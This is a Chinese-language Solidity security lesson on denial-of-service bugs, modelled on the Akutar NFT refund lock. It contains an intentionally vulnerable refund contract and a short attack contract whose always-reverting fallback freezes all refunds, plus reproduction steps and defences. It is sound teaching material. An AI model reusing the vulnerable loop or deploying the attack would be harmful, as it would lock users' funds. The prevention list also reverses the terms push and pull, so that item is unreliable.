---
title: S09. 拒绝服务
tags:
  - solidity
  - security
  - fallback
---

# WTF Solidity 合约安全: S09. 拒绝服务

我最近在重新学 solidity，巩固一下细节，也写一个“WTF Solidity 极简入门”，供小白们使用（编程大佬可以另找教程），每周更新 1-3 讲。

推特：[@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

社区：[Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[官网 wtf.academy](https://wtf.academy)

所有代码和教程开源在 github: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTFSolidity)

---

这一讲，我们将介绍智能合约的拒绝服务（Denial of Service, DoS）漏洞，并介绍预防的方法。NFT 项目 Akutar 曾因为 DoS 漏洞损失 11,539 ETH，当时价值 3400 万美元。

## DoS

在 Web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。

在 2022 年 4 月，一个很火的 NFT 项目名为 Akutar，他们使用[荷兰拍卖](https://github.com/AmazingAng/WTF-Solidity/tree/main/35_DutchAuction)进行公开发行，筹集了 11,539.5 ETH，非常成功。之前持有他们社区 Pass 的参与者会得到 0.5 ETH 的退款，但是他们处理退款的时候，发现智能合约不能正常运行，全部资金被永远锁在了合约里。他们的智能合约有拒绝服务漏洞。

![](./img/S09-1.png)

## 漏洞例子

下面我们学习一个简化了的 Akutar 合约，名字叫 `DoSGame`。这个合约逻辑很简单，游戏开始时，玩家们调用 `deposit()` 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，`refund()`函数被调用，将 ETH 依次退款给所有玩家。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用deposit退钱。
contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;

    // 所有玩家存ETH到合约里
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // 记录存款
        balanceOf[msg.sender] = msg.value;
        // 记录玩家地址
        players.push(msg.sender);
    }

    // 游戏结束，退款开始，所有玩家将依次收到退款
    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        // 通过循环给所有玩家退款
        for(uint256 i; i < pLength; i++){
            address player = players[i];
            uint256 refundETH = balanceOf[player];
            (bool success, ) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}
```

这里的漏洞在于，`refund()` 函数中利用循环退款的时候，是使用的 `call` 函数，将激活目标地址的回调函数，如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行。

```
(bool success, ) = player.call{value: refundETH}("");
```

下面我们写个攻击合约， `attack()` 函数中将调用 `DoSGame` 合约的 `deposit()` 存款并参与游戏；`fallback()` 回调函数将回退所有向该合约发送`ETH`的交易，对`DoSGame` 合约中的 DoS 漏洞进行了攻击，所有退款将不能正常进行，资金被锁在合约中，就像 Akutar 合约中的一万多枚 ETH 一样。

```solidity
contract Attack {
    // 退款时进行DoS攻击
    fallback() external payable{
        revert("DoS Attack!");
    }

    // 参与DoS游戏并存款
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}
```

## `Remix` 复现

**1.** 部署 `DoSGame` 合约。
**2.** 调用 `DoSGame` 合约的 `deposit()`，进行存款并参与游戏。
![](./img/S09-2.png)
**3.** 此时，如果游戏结束调用 `refund()` 退款的话是可以正常退款的。
![](./img/S09-3.jpg)
**3.** 重新部署 `DoSGame` 合约，并部署 `Attack` 合约。
**4.** 调用 `Attack` 合约的 `attack()`，进行存款并参与游戏。
![](./img/S09-4.jpg)
**5.** 调用 `DoSGame` 合约`refund()`，进行退款，发现不能正常运行，攻击成功。
![](./img/S09-5.jpg)

## 预防方法

很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方：

1. 外部合约的函数调用（例如 `call`）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 `require(success, "Refund Fail!");` 去掉，退款在单个地址失败时仍能继续运行。
2. 合约不会出乎意料的自毁。
3. 合约不会进入无限循环。
4. `require` 和 `assert` 的参数设定正确。
5. 退款时，让用户从合约自行领取（push），而非批量发送给用户(pull)。
6. 确保回调函数不会影响正常合约运行。
7. 确保当合约的参与者（例如 `owner`）永远缺席时，合约的主要业务仍能顺利运行。

## 总结

这一讲，我们介绍了智能合约的拒绝服务漏洞，Akutar 项目因为该漏洞损失了一万多枚ETH。很多逻辑错误都能导致DoS，开发者写智能合约时要万分谨慎，比如退款要让用户自行领取，而非合约批量发送给用户。
